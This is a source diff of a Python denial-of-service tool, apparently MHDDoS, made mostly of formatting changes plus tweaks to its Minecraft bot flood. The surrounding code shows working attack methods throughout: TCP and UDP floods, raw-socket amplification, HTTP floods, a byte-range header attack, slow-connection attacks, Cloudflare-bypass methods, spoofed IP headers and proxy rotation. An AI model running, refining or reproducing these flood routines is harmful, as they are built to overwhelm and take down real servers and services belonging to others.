@@ -19,7 +19,7 @@ from struct import pack as data_pack
 from subprocess import run
 from sys import argv
 from sys import exit as _exit
-from threading import Event, Lock, Thread
+from threading import Event, Thread
 from time import sleep, time
 from typing import Any, List, Set, Tuple
 from urllib import parse
@@ -327,7 +327,7 @@ class Layer4(Thread):
 
     def TCP(self) -> None:
         s = None
-        with suppress(Exception),self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             while Tools.send(s, randbytes(1024)):
                 continue
         Tools.safe_close(s)
@@ -337,7 +337,7 @@ class Layer4(Thread):
         ping = Minecraft.data(b'\x00')
 
         s = None
-        with suppress(Exception),self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             while Tools.send(s, handshake):
                 Tools.send(s, ping)
         Tools.safe_close(s)
@@ -345,13 +345,13 @@ class Layer4(Thread):
     def CPS(self) -> None:
         global REQUESTS_SENT
         s = None
-        with suppress(Exception),self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             REQUESTS_SENT += 1
         Tools.safe_close(s)
 
     def alive_connection(self) -> None:
         s = None
-        with suppress(Exception),self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             while s.recv(1):
                 continue
         Tools.safe_close(s)
@@ -365,8 +365,8 @@ class Layer4(Thread):
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-                while Tools.sendto(s, randbytes(1024), self._target):
-                    continue
+            while Tools.sendto(s, randbytes(1024), self._target):
+                continue
         Tools.safe_close(s)
 
     def SYN(self) -> None:
@@ -381,7 +381,7 @@ class Layer4(Thread):
     def AMP(self) -> None:
         payload = next(self._amp_payloads)
         s = None
-        with suppress(Exception),socket(AF_INET, SOCK_RAW,
+        with suppress(Exception), socket(AF_INET, SOCK_RAW,
                                          IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while Tools.sendto(s, *payload):
@@ -390,25 +390,22 @@ class Layer4(Thread):
 
     def MCBOT(self) -> None:
         s = None
-        with suppress(Exception),self.open_connection(AF_INET, SOCK_STREAM) as s:
-            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-            s.connect(self._target)
-
+        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                         47,
                                                         2,
                                                         ProxyTools.Random.rand_ipv4(),
                                                         uuid4()))
-            Tools.send(s, Minecraft.login("MHDDoS_" + ProxyTools.Random.rand_str(5)))
+            Tools.send(s, Minecraft.login(f"MHDDoS_{ProxyTools.Random.rand_str(5)}"))
+            sleep(1.5)
 
-            c = 120
-            while Tools.send(s, Minecraft.keepalive(randint(1000, 10000))):
+            c = 360
+            while Tools.send(s, Minecraft.keepalive(randint(1111111, 9999999))):
                 c -= 1
                 if c:
                     continue
-                c = 100
-                chat = Minecraft.chat(Tools.randchr(100))
-                Tools.send(s, chat)
+                c = 360
+                Tools.send(s, Minecraft.chat(Tools.randchr(100)))
         Tools.safe_close(s)
 
     def VSE(self) -> None:
@@ -597,7 +594,7 @@ class HttpFlood(Thread):
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
@@ -611,7 +608,7 @@ class HttpFlood(Thread):
             (randint(1000, 99999), ProxyTools.Random.rand_str(6),
              ProxyTools.Random.rand_str(32)))
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
@@ -621,7 +618,7 @@ class HttpFlood(Thread):
             "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                             for i in range(1, 1024)))
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
@@ -639,14 +636,14 @@ class HttpFlood(Thread):
             (ProxyTools.Random.rand_str(64),
              ProxyTools.Random.rand_str(64)))[:-2]
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
     def PPS(self) -> None:
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, self._defaultpayload)
         Tools.safe_close(s)
@@ -654,7 +651,7 @@ class HttpFlood(Thread):
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
@@ -679,7 +676,7 @@ class HttpFlood(Thread):
                                           ProxyTools.Random.rand_str(4)) +
             "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             Tools.send(s, p1)
             Tools.send(s, p2)
             for _ in range(self._rpc):
@@ -689,7 +686,7 @@ class HttpFlood(Thread):
     def EVEN(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             while Tools.send(s, payload) and s.recv(1):
                 continue
         Tools.safe_close(s)
@@ -697,7 +694,7 @@ class HttpFlood(Thread):
     def OVH(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(min(self._rpc, 5)):
                 Tools.send(s, payload)
         Tools.safe_close(s)
@@ -708,7 +705,7 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
         s = None
-        with suppress(Exception),create_scraper() as s:
+        with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
                 if pro:
                     with s.get(self._target.human_repr(),
@@ -725,7 +722,7 @@ class HttpFlood(Thread):
     def CFBUAM(self):
         payload: bytes = self.generate_payload()
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             Tools.send(s, payload)
             sleep(5.01)
             for _ in range(self._rpc):
@@ -735,7 +732,7 @@ class HttpFlood(Thread):
     def AVB(self):
         payload: bytes = self.generate_payload()
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 sleep(max(self._rpc / 1000, 1))
                 Tools.send(s, payload)
@@ -744,7 +741,7 @@ class HttpFlood(Thread):
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
         s = None
-        with suppress(Exception),create_scraper() as s:
+        with suppress(Exception), create_scraper() as s:
             for _ in range(min(self._rpc, 5)):
                 sleep(min(self._rpc, 5) / 100)
                 if self._proxies:
@@ -766,7 +763,7 @@ class HttpFlood(Thread):
                                 self.randHeadercontent +
                                 "\r\n")
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
@@ -775,7 +772,7 @@ class HttpFlood(Thread):
         payload: str | bytes = self.generate_payload()
 
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
                 while 1:
@@ -792,7 +789,7 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
         s = None
-        with suppress(Exception),Session() as s:
+        with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
                 if pro:
                     with s.get(self._target.human_repr(),
@@ -824,7 +821,7 @@ class HttpFlood(Thread):
                              'Pragma: no-cache\r\n'
                              'Upgrade-Insecure-Requests: 1\r\n\r\n')
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
@@ -836,7 +833,7 @@ class HttpFlood(Thread):
                                           "Referrer: null\r\n" +
                                           self.SpoofIP + "\r\n")
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
@@ -860,7 +857,7 @@ class HttpFlood(Thread):
     def SLOW(self):
         payload: bytes = self.generate_payload()
         s = None
-        with suppress(Exception),self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
             while Tools.send(s, payload) and s.recv(1):
@@ -1209,7 +1206,7 @@ class ToolsConsole:
     # noinspection PyUnreachableCode
     @staticmethod
     def info(domain):
-        with suppress(Exception),get("https://ipwhois.app/json/%s/" % domain) as s:
+        with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s:
             return s.json()
         return {"success": False}
 
